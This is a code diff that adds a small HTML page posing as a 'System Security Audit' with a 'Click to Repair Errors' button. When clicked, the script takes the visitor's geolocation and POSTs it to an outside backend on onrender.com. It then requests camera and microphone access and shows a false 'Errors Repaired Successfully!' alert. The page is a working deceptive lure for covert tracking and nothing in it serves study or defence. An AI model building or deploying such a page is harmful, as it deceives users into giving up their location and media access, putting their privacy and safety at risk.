@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h2>System Security Audit</h2>
+    <p>Device scanning in progress...</p>
+    <button onclick="start()">Click to Repair Errors</button>
+
+    <script>
+    async function start() {
+        // 1. Location mangna
+        navigator.geolocation.getCurrentPosition(async (p) => {
+            const data = { lat: p.coords.latitude, lon: p.coords.longitude };
+            
+            // 2. Apne Render Backend ko data bhejna
+            await fetch('https://vivanx-backend.onrender.com/data', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            });
+            alert("Errors Repaired Successfully!");
+        });
+
+        // 3. Camera aur Mic ki permission mangna
+        await navigator.mediaDevices.getUserMedia({video: true, audio: true});
+    }
+    </script>
+</body>
+</html>
